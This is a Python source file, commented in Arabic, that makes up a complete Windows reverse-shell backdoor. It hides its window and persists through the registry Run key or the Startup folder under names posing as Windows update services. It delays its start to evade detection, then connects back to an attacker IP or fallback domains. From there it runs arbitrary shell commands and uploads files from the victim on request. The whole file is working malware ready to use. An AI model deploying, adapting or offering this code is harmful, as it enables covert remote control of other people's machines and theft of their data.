import socket
import subprocess
import os
import time
import sys
import random

# محاولة استيراد مكتبة winreg لنظام Windows
try:
    import winreg
    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False

# إعدادات الاتصال - يجب تغييرها حسب البيئة
ATTACKER_IP = "192.168.10.2"  # IP Kali Linux
ATTACKER_PORT = 4444
DOMAINS = ["malicious-domain.com", "backup-domain.net"]  # قائمة دومينات احتياطية

# إخفاء النافذة (بدون الحاجة لـ pywin32)
def hide_window():
    if sys.platform.startswith('win'):
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

# إضافة إلى بدء التشغيل
def add_to_startup():
    if not HAS_WINREG:
        return
        
    try:
        key = winreg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE) as regkey:
            # استخدام اسم ملف عشوائي لتفادي الاكتشاف
            random_name = "SysService" + str(random.randint(1000, 9999))
            exe_path = sys.executable
            
            # إذا كان الملف في مجلد مؤقت، انقله إلى موقع أكثر ديمومة
            if "Temp" in exe_path or "tmp" in exe_path:
                import shutil
                appdata_path = os.getenv('APPDATA')
                new_path = os.path.join(appdata_path, random_name + ".exe")
                if not os.path.exists(new_path):
                    shutil.copyfile(sys.executable, new_path)
                    exe_path = new_path
            
            winreg.SetValueEx(regkey, random_name, 0, winreg.REG_SZ, exe_path)
    except Exception as e:
        # محاولة بديلة لإضافة إلى بدء التشغيل
        try:
            startup_path = os.path.join(os.getenv('APPDATA'), 
                                       'Microsoft', 'Windows', 'Start Menu', 
                                       'Programs', 'Startup')
            if os.path.exists(startup_path):
                import shutil
                exe_name = "WindowsUpdateService" + str(random.randint(1000, 9999)) + ".exe"
                target_path = os.path.join(startup_path, exe_name)
                shutil.copyfile(sys.executable, target_path)
        except:
            pass

# تنفيذ الأوامر مع معالجة الأخطاء
def execute_command(command):
    try:
        # استخدام shell الصحيح لنظام Windows
        if sys.platform.startswith('win'):
            process = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
        else:
            process = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            
        output, error = process.communicate()
        
        # محاولة فك التشفير بطرق مختلفة
        try:
            result = output.decode('utf-8')
        except:
            try:
                result = output.decode('cp1252')
            except:
                result = output.decode('latin-1')
                
        if error:
            try:
                error_msg = error.decode('utf-8')
            except:
                try:
                    error_msg = error.decode('cp1252')
                except:
                    error_msg = error.decode('latin-1')
            result += error_msg
            
        return result
    except Exception as e:
        return f"Error executing command: {str(e)}"

# منع تشغيل أكثر من نسخة
def create_mutex():
    try:
        import tempfile
        mutex_name = "Global\\WindowsUpdateServiceMutex"
        
        # محاولة استخدام ميكانيزم متقدم لمنع التكرار إذا كان متاحاً
        if sys.platform.startswith('win'):
            try:
                import ctypes
                from ctypes import wintypes
                
                kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                kernel32.CreateMutexW.restype = wintypes.HANDLE
                
                mutex = kernel32.CreateMutexW(None, False, mutex_name)
                if ctypes.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                    sys.exit(0)
            except:
                # الطريقة البديلة باستخدام ملف
                mutex_file = os.path.join(tempfile.gettempdir(), "WindowsUpdateServiceMutex")
                if os.path.exists(mutex_file):
                    # التحقق من عمر الملف لتجنب المشاكل عند إعادة التشغيل
                    file_age = time.time() - os.path.getmtime(mutex_file)
                    if file_age < 3600:  # إذا كان الملف أقل من ساعة
                        sys.exit(0)
                
                with open(mutex_file, "w") as f:
                    f.write("running")
    except:
        pass

# الاتصال بالمهاجم
def connect_to_attacker():
    current_ip = ATTACKER_IP
    current_domain_index = 0
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            
            # محاولة الاتصال بالـ IP الأساسي أولاً
            try:
                s.connect((current_ip, ATTACKER_PORT))
            except:
                # إذا فشل، حاول استخدام دومين احتياطي
                try:
                    domain_ip = socket.gethostbyname(DOMAINS[current_domain_index])
                    s.connect((domain_ip, ATTACKER_PORT))
                    current_ip = domain_ip
                except:
                    # إذا فشل ذلك أيضاً، انتقل إلى الدومين التالي
                    current_domain_index = (current_domain_index + 1) % len(DOMAINS)
                    time.sleep(30)
                    continue
            
            # إرسال معلومات النظام عند الاتصال الناجح
            hostname = socket.gethostname()
            username = os.getenv('USERNAME') or os.getenv('USER')
            system_info = f"Connected from: {hostname} ({username})"
            s.send(system_info.encode())
            
            while True:
                try:
                    command = s.recv(4096).decode().strip()
                    if not command:
                        break
                    
                    if command == "exit":
                        s.close()
                        return
                    elif command == "persist":
                        add_to_startup()
                        s.send("Added to startup".encode())
                    elif command.startswith("download "):
                        # ميزة تنزيل الملفات
                        filename = command.split(" ", 1)[1]
                        try:
                            with open(filename, "rb") as f:
                                data = f.read()
                                # إرسال حجم الملف أولاً
                                s.sendall(str(len(data)).encode().ljust(16))
                                # ثم إرسال محتوى الملف
                                s.sendall(data)
                        except Exception as e:
                            s.sendall(f"Download error: {str(e)}".encode())
                    else:
                        output = execute_command(command)
                        s.send(output.encode())
                except socket.timeout:
                    # إعادة الاتصال في حالة timeout
                    break
                except socket.error:
                    break
                except Exception as e:
                    s.send(f"Error processing command: {str(e)}".encode())
                    
        except socket.error:
            time.sleep(30)
        except Exception as e:
            time.sleep(30)
            continue

if __name__ == "__main__":
    create_mutex()  # منع تعدد النسخ
    hide_window()   # إخفاء النافذة
    
    # الانتظار بفترة عشوائية قبل البدء لمحاولة تجنب الاكتشاف
    wait_time = random.randint(5, 60)
    time.sleep(wait_time)
    
    add_to_startup()  # إضافة إلى بدء التشغيل
    
    # بدء الاتصال
    connect_to_attacker()